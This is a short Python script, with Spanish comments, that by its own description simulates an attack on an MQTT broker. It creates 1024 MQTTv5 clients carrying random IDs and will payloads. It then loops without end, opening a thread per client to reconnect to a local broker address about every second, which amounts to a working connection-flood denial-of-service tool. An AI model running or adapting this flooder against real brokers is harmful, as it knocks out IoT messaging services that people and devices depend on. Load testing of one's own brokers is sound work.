# -*- coding: utf-8 -*-
"""
Created on Thu Aug 11 22:48:50 2022

@author: james
programa para crear n clientes y conectarlos
y posteriormente los ejecuta en multihilos para simular ataque
comprend dos tipos de ataqueno will payload y will payload
"""

import threading
import random
import paho.mqtt.client as mqtt
import time
from paho.mqtt.properties import Properties
from paho.mqtt.packettypes import PacketTypes

################################################
###### parametros DE CONEXION
clients=[] #array clientes
broker = '192.168.100.80'
port = 1883

nclients=1024 #NUM CONEXIONES/clientes
keepalive=60
sesionExpira=30
conn_properties=Properties(PacketTypes.CONNECT)
################################################
#creacion de clientes
for i  in range(nclients):
    cname=f'python-mqtt-Cliente_{random.randint(0, 1000000000000000000)}' #funcion para crear id aleatorio
    client=mqtt.Client(cname, protocol=mqtt.MQTTv5)
   #DECLARANDO MENSAJE DE INICIO con QoS=0
    client.will_set("/",f'python-mqtt_will_payload_-{random.randint(0, 10000000000000000)}', 0)
       #conn_properties=Properties(PacketTypes.CONNECT)
    conn_properties.SessionExpiryInterval = sesionExpira
    clients.append(client)

################################################

def conectar(client,**datos):
    serverBRK=datos['broker']
    puertoMQTT=datos['puerto']
    keepAlive=datos['keepAlv']
    propertiesOpt=datos['connProperties']
    print(client.connect(serverBRK, puertoMQTT, keepAlive, properties=propertiesOpt))
    

NUM_HILOS = nclients
#funcion multihilo

while True:
    for clientN in clients:
        hilo = threading.Thread(target=conectar, args=(clientN,),
                                    kwargs={'broker':broker, 
                                            'puerto': port, 
                                            'keepAlv': keepalive, 
                                            'connProperties': conn_properties})
        hilo.start()
    time.sleep(0.97)